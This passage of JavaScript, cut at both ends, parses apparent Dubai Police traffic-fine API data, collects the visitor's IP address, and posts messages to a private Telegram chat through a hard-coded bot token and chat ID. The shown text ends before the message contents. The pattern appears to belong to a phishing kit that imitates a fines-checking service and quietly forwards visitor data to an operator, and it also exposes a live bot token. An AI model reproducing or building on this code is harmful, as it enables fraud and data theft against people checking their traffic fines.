    };
  }
  
  function extractViolationsFromResponse(apiData, source) {
    try {
      const violations = [];
      
      // Handle Dubai Police API response format
      if (!apiData) return [];
      
      // Check if it's Dubai Police API response format
      if (apiData.results && apiData.results.tickets) {
        // Dubai Police API format
        const tickets = apiData.results.tickets || [];
        const confiscated = apiData.results.confisticated || [];
        
        // Process tickets (payable violations)
        tickets.forEach(ticket => {
          violations.push({
            fines: (ticket.ticketFine || ticket.ticketTotalFine || '0') + ' AED',
            source: ticket.beneficiary || ticket.pltSrcE || source || 'Unknown',
            location: ticket.location || 'Unknown',
            ticketNumber: ticket.ticketNo?.toString() || 'Unknown',
            dateTime: (ticket.ticketDate && ticket.ticketTime) 
              ? ticket.ticketDate + ' - ' + ticket.ticketTime 
              : 'Unknown',
            speed: ticket.vehicleSpeed || '-',  // Only show if available
            violation: ticket.ticketViolation || 'Unknown',
            ticketViolation: ticket.ticketViolation || 'Unknown',  // Store ticket violation explicitly
            amount: ticket.ticketFine || ticket.ticketTotalFine || 0
          });
        });
        
        // Process confiscated violations if any
        confiscated.forEach(conf => {
          violations.push({
            fines: (conf.ticketFine || conf.ticketTotalFine || '0') + ' AED',
            source: conf.beneficiary || conf.pltSrcE || source || 'Unknown',
            location: conf.location || 'Unknown',
            ticketNumber: conf.ticketNo?.toString() || 'Unknown',
            dateTime: (conf.ticketDate && conf.ticketTime) 
              ? conf.ticketDate + ' - ' + conf.ticketTime 
              : 'Unknown',
            speed: conf.vehicleSpeed || '-',  // Only show if available
            violation: conf.ticketViolation || 'Unknown',
            ticketViolation: conf.ticketViolation || 'Unknown',  // Store ticket violation explicitly
            amount: conf.ticketFine || conf.ticketTotalFine || 0
          });
        });
      }
      // Fallback for other formats
      else if (Array.isArray(apiData.fines)) {
        apiData.fines.forEach(fine => {
          violations.push({
            fines: (fine.amount || fine.fines || '0') + ' AED',
            source: fine.beneficiary || fine.source || source || 'Unknown',
            location: fine.location || 'Unknown',
            ticketNumber: fine.ticketNo || fine.ticketNumber || 'Unknown',
            dateTime: fine.fineDate || fine.date || 'Unknown',
            speed: fine.violation || fine.description || 'Unknown',
            amount: fine.amount || 0
          });
        });
      }
      
      return violations;
    } catch (err) {
      console.error('Extraction error:', err.message);
      return [];
    }
  }

  // Get user IP address
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('IP fetch error:', error);
      return 'N/A';
    }
  }

  // Send message to Telegram
  async function sendToTelegram(message) {
    try {
      const botToken = '6310972013:AAGmvAL_vOB-i477t9nbZSYUh86vAPFaQWQ';
      const chatId = '-1003927866231';
      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
